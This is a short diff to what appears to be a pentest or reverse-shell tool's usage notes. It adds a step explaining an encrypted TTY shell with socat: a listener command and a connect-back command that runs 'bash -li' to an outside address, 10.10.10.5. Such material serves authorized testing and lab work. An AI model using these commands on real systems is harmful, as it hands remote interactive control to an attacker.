@@ -76,4 +76,6 @@ Steps to use the feature:
     ### Example: (attacker< >target)
     ![image](https://github.com/user-attachments/assets/8992c65c-aead-4452-bb6a-aeea142ae7a9)
 
-6. what if we want to use the tty technique with the encrypted shell? here is the command to use: `socat OPENSSL-LISTEN:53 FILE:`tty`,raw,echo=0,cert=shell.pem,verify=0 -`.
+6. what if we want to use the tty technique with the encrypted shell? here is the command to use: `socat OPENSSL-LISTEN:53 FILE:`tty`,raw,echo=0,cert=shell.pem,verify=0 -`, and to connect back, we use `socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`.
+
+
